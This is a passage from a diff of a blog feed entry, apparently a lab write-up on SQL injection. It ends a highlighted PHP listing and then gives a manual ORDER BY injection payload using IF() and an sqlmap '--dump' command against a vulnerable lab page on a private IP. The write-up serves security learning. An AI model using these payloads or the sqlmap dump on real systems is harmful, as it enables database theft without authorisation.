+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>    
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">require</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since there is no back-tick. I will use IF function to inject the payload of &ldquo;order by&rdquo;</p>
+
+<p>manually exploit:</p>
+
+<p><code>http://192.168.79.162/sqli/example9.php?order=if(1&gt;2, name, age)</code></p>
+
+<p>sqlmap exploit:</p>
+
+<p><code>sqlmap -u "http://192.168.79.162/sqli/example9.php?order=id" --dump</code></p>
+]]></content>
+  </entry>
+  
+</feed>
